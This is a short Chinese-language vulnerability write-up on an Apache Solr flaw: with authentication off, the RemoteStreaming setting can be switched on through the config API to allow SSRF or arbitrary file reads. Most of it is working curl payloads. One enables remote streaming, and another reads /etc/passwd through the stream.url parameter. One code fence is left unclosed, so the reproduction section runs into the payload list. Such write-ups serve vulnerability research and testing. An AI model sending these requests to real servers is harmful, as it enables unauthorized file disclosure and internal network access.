# Apache Solr RemoteStreaming 文件读取与SSRF漏洞

## 漏洞描述
Apache Solr 是一个开源的搜索服务器。在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或任意文件读取。

参考链接：

- https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ

## 危害等级
MEDIUM

## 参考链接
- https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ

## 漏洞复现方法
首先，访问`http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json`获取数据库名：

![image-20220301133315348](images/202203011333403.png)

发送如下数据包，修改数据库`demo`的配置，开启`RemoteStreaming`：

```
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://your-ip:8983/solr/demo/config'

## Payloads
```
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://your-ip:8983/solr/demo/config'
```
```
curl -i -s -k 'http://your-ip:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```
